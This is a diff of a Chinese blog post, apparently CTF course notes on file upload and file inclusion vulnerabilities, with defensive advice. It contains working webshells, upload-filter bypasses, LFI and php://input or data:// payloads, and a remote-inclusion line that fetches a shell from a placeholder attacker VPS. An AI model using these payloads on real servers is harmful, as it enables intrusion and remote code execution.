@@ -19,18 +19,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"D:\\study\\blog\\node_modules\\hexo-generator-searchdb\\templates\\search.xml"};
   </script>
 
-  <meta name="description" content="文件上传姿势总结对于近期学习的文件上传的方式进行一个总结。">
+  <meta name="description" content="文件上传姿势总结对于近期学习的文件上传的方式进行一个总结。本文除去二次渲染部分，其余部分均为nep联合战队ctf入门课中，firebasky文件上传课程讲解的课件。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传漏洞总结">
 <meta property="og:url" content="http://example.com/2021/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="枫霜月雨のblog">
-<meta property="og:description" content="文件上传姿势总结对于近期学习的文件上传的方式进行一个总结。">
+<meta property="og:description" content="文件上传姿势总结对于近期学习的文件上传的方式进行一个总结。本文除去二次渲染部分，其余部分均为nep联合战队ctf入门课中，firebasky文件上传课程讲解的课件。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/image-20210208225003833.png">
+<meta property="og:image" content="c:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/4.png">
 <meta property="article:published_time" content="2021-04-25T00:42:10.000Z">
-<meta property="article:modified_time" content="2021-04-26T00:38:35.960Z">
+<meta property="article:modified_time" content="2021-05-01T03:46:34.433Z">
 <meta property="article:author" content="枫霜月雨">
 <meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/image-20210208225003833.png">
 
 <link rel="canonical" href="http://example.com/2021/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
 
@@ -224,7 +227,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-26 08:38:35" itemprop="dateModified" datetime="2021-04-26T08:38:35+08:00">2021-04-26</time>
+                <time title="修改时间：2021-05-01 11:46:34" itemprop="dateModified" datetime="2021-05-01T11:46:34+08:00">2021-05-01</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -242,14 +245,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>9.9k</span>
+              <span>20k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
+              <span>18 分钟</span>
             </span>
 
         </div>
@@ -261,9 +264,79 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="文件上传姿势总结"><a href="#文件上传姿势总结" class="headerlink" title="文件上传姿势总结"></a>文件上传姿势总结</h1><p>对于近期学习的文件上传的方式进行一个总结。</p>
+        <h1 id="文件上传姿势总结"><a href="#文件上传姿势总结" class="headerlink" title="文件上传姿势总结"></a>文件上传姿势总结</h1><p>对于近期学习的文件上传的方式进行一个总结。本文除去二次渲染部分，其余部分均为nep联合战队ctf入门课中，firebasky文件上传课程讲解的课件。</p>
 <span id="more"></span>
 
+
+
+<blockquote>
+<p>什么是文件上传？文件上传有什么用。</p>
+</blockquote>
+<h2 id="文件上传漏洞介绍"><a href="#文件上传漏洞介绍" class="headerlink" title="文件上传漏洞介绍"></a>文件上传漏洞介绍</h2><blockquote>
+<p>一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/php_file_upload.asp">文件上传</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>注意form表单里面的enctype属性为二进制数据multipart/form-data </code></p>
+<p><strong>注释：允许用户上传文件是一个巨大的安全风险。请仅仅允许可信的用户执行文件上传操作。</strong></p>
+<h2 id="php-jsp-asp小马"><a href="#php-jsp-asp小马" class="headerlink" title="php jsp asp小马"></a>php jsp asp小马</h2><blockquote>
+<p>相信大家已经听了南浔姐姐讲的web第一节课，了解了一句话木马的相关操</p>
+<p>作，我给没赶上上次课的同学再简单说说</p>
+</blockquote>
+<p><strong>介绍一些</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span><span class="comment">#经典的一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;0&quot;</span>));%&gt;</span><br><span class="line">#https://www.jianshu.com/p/123db17b78a0  #jsp木马</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&quot;0&quot;))%&gt;</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;asp&#x2F;met_execute.asp</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaozi&#x2F;p&#x2F;7560907.html  #asp木马</span><br></pre></td></tr></table></figure>
+
+<p><code>我们将一些危险的代码上传到服务器让其执行就可能危险到服务器的安全</code></p>
+<h2 id="菜刀蚁剑介绍"><a href="#菜刀蚁剑介绍" class="headerlink" title="菜刀蚁剑介绍"></a>菜刀蚁剑介绍</h2><p><a target="_blank" rel="noopener" href="https://www.fujieace.com/hacker/tools/antsword.html">蚁剑安装</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36235492/article/details/85713821">菜刀蚁剑</a></p>
+<h2 id="文件上传如何利用？"><a href="#文件上传如何利用？" class="headerlink" title="文件上传如何利用？"></a>文件上传如何利用？</h2><p>现在我们知道了什么是文件上传和文件上传的危害，那么如何进行利用？</p>
+<p>利用条件是什么？</p>
+<ul>
+<li>能够绕过服务器上传脚本文件(php asp jsp)</li>
+<li>知道上传文件的路径和文件名</li>
+</ul>
+<h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><blockquote>
+<p>但是一般的网站都会来验证用户上传的信息，下面介绍一下常见的校验方法和绕过方法。</p>
+</blockquote>
+<p>实验靶机：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2435">wp</a></p>
+<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><ul>
+<li>javascript校验（一般只校验后缀名）upload-labs 第一关（浏览器 bp都可以）</li>
+</ul>
+<h4 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h4><ul>
+<li><p>content-type验证 upload-labs 第二关</p>
+</li>
+<li><p>文件扩展名校验  (<code>白名单</code>、<code>黑名单</code>)  upload-labs 第三关</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">白名单:   png jpg gif</span><br><span class="line">黑名单:  (不能上传这些后缀名) php  jsp asp </span><br></pre></td></tr></table></figure></li>
+<li><p>文件内容头校验（<code>GIF89a</code>）文件幻数检测</p>
+</li>
+<li><p>文件内容检测 (检测内容是否合法或含有恶意代码   二次渲染配合文件包含<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-3">二次渲染</a></p>
+</li>
+</ul>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">找漏网之鱼：php3,php4,php7等 (PHP版本&lt;5.3可使用%00截断) </span><br><span class="line">AddType application&#x2F;x-httpd-php .php .php3 .php5 .php7</span><br><span class="line"></span><br><span class="line">大小写绕过：AsP、pHP</span><br><span class="line">文件后缀双写绕过   php &quot;&quot;</span><br><span class="line"></span><br><span class="line">上传不符合windows文件命名规则的文件名 test.php:1.jpg test.php::$DATA 会被windows系统自动去掉不符合规则符号后面的内容</span><br><span class="line">配合解析漏洞绕过</span><br><span class="line"></span><br><span class="line">%00截断 (PHP&lt;5.3.4时 shell.php%00.jpg 可截断%00后的内容) 配合解析漏洞绕过</span><br><span class="line">c语言里面的%00</span><br><span class="line"></span><br><span class="line">.htaccess绕过   (apache)</span><br><span class="line">.user.ini绕过   (nginx)</span><br></pre></td></tr></table></figure>
+
+<h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h3><p><code>如upload-labs第四关</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</span><br><span class="line">.htaccess主要的作用有：</span><br><span class="line">URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</span><br></pre></td></tr></table></figure>
+
+<p><strong>php网站在进行解析php的时候会首先解析当前目录下的配置文件</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">1.jpg</span>&quot;&gt;</span>  //匹配文件</span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line">    //SetHandler方法将1.jpg当成php代码执行</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">// 作用范围 当前目录</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="内容检测"><a href="#内容检测" class="headerlink" title="内容检测"></a>内容检测</h3><p><code>一般来说是对上传的文件的内容进行一个检测，比如&lt;? ?&gt; php 等等</code></p>
+<p>绕过思路是去构造免杀的webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);&lt;/script&gt;<span class="comment">#PHP5 支持</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>实验</strong></p>
+<p>ctfshow web168</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cat ../f*&#x27;</span>);</span><br><span class="line">array_map(<span class="variable">$func</span>, <span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="FUZZ字典"><a href="#FUZZ字典" class="headerlink" title="FUZZ字典"></a>FUZZ字典</h2><p><strong>fuzz模糊测试</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php3 php4 php5 php6</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></p>
 <h2 id="二次渲染的三种姿势"><a href="#二次渲染的三种姿势" class="headerlink" title="二次渲染的三种姿势"></a>二次渲染的三种姿势</h2><p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">Upload-Labs第Pass-16通关（二次渲染绕过） 详解</a></p>
 <h3 id="GIF绕过姿势"><a href="#GIF绕过姿势" class="headerlink" title="GIF绕过姿势"></a>GIF绕过姿势</h3><p>先用copy命令安排一个图片马：</p>
@@ -297,6 +370,157 @@
 <p>4、验证；将上传的图片再次下载到本地。</p>
 <p>可以看到，php代码没有被去除，证明我们成功上传了含有php代码的jpg图片。</p>
 <p>注意：有一些jpg图片不能被处理，所以要多尝试一些jpg图片。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote>
+<ul>
+<li>文件扩展名服务端白名单效验</li>
+<li>文件内容服务端效验  &lt;? php </li>
+<li>上传文件重命名</li>
+<li>隐藏上传文件路径</li>
+<li>限制相关目录的执行权限，防范WebShell攻击</li>
+</ul>
+</blockquote>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><blockquote>
+<p>程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。</p>
+<p>但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞</p>
+</blockquote>
+<h3 id="demo实验"><a href="#demo实验" class="headerlink" title="demo实验"></a>demo实验</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()		<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line">    <span class="comment">//warning</span></span><br><span class="line"><span class="keyword">include_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()		<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><blockquote>
+<p>用户可以控制包含的文件名，从而造成信息泄露和getshell</p>
+</blockquote>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.读敏感文件</span><br><span class="line">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">2.利用封装协议读源码</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php	#这样能看到php文件的源码</span><br><span class="line"></span><br><span class="line">4.包含日志文件getshell</span><br><span class="line">路径</span><br><span class="line">apache:&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line"></span><br><span class="line">3.包含图片Getshell</span><br><span class="line">在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</span><br><span class="line"></span><br><span class="line">5.session文件包含getshell</span><br></pre></td></tr></table></figure>
+
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>CTFSHOW-web80-81</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>
+
+<h4 id="照片木马的制作"><a href="#照片木马的制作" class="headerlink" title="照片木马的制作"></a>照片木马的制作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令copy 1.png&#x2F;b + 1.php&#x2F;a 2.jpg </span><br><span class="line">前两个文件合并成一个文件，文件属性为2.jpg</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h2><h4 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</span><br><span class="line">include()&#x2F;require()&#x2F;include_once()&#x2F;require_once()参数可控的情况下</span><br></pre></td></tr></table></figure>
+
+<h4 id="php"><a href="#php" class="headerlink" title="php://"></a><strong>php://</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen:off&#x2F;on</span><br><span class="line">allow_url_include : 部分需要on (下面列出)</span><br><span class="line">php:&#x2F;&#x2F;input  #用的比较多 输入流</span><br></pre></td></tr></table></figure>
+
+<p><strong>作用：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是 php://filter 和 php://input</span></span><br><span class="line">php:<span class="comment">//filter用于读取源码，php://input用于执行php代码</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phpinfo.php</span><br><span class="line"><span class="comment">#ctfshow web78</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.php://input + [POST DATA]执行php代码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分] &lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.若有写入权限，[POST DATA部分] 写入一句话木马</span></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p><strong>条件：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line"></span><br><span class="line">allow_url_include :on</span><br><span class="line">#ctfshow web79</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt;   &lt;?php system(&#39;cat flag.php&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>作用</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">自PHP&gt;=<span class="number">5.2</span>.<span class="number">0</span>起，可以使用 data:<span class="comment">// 数据流封装器，以传递相应格式的数据。</span></span><br><span class="line">通常可以用来执行PHP代码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.data://text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.data://text/plain;base64,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="远程文件包含-RFL"><a href="#远程文件包含-RFL" class="headerlink" title="远程文件包含(RFL)"></a>远程文件包含(RFL)</h2><blockquote>
+<p>服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，</p>
+<p>从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。</p>
+</blockquote>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>条件：</strong><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p>
+<p><strong>1、远程包含Webshell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br><span class="line"><span class="comment">#会在网站目录生成名为 shell.php 的一句话木马</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>shell.txt内容为：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%2562ase64-encode&#x2F;resource</span><br></pre></td></tr></table></figure>
+
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h4><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5535#toc-2">浅析php文件包含及其getshell的姿势</a></p>
+<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>禁止远程文件包含 <code>allow_url_include=off</code></li>
+<li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li>
+<li>过滤<code>../</code>等特殊符号</li>
+<li>修改Apache日志文件的存放地址</li>
+<li>开启魔术引号 <code>magic_quotes_qpc=on  php 4 5</code> </li>
+<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文件上传经常和文件包含一起考察。  如：ctfshow web164</p>
+<ul>
+<li><p>判断是黑名单还是白名单</p>
+</li>
+<li><p>白名单解析漏洞绕过，配合文件包含 照片二次渲染等等</p>
+</li>
+<li><p>黑名单扩展名绕过或.htaccess,.user.ini等绕过总结</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include() url</span><br><span class="line">file_get_concent()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头）"></a>文件幻数检测（文件开头）</h3><blockquote>
+<p>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
+</blockquote>
+<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
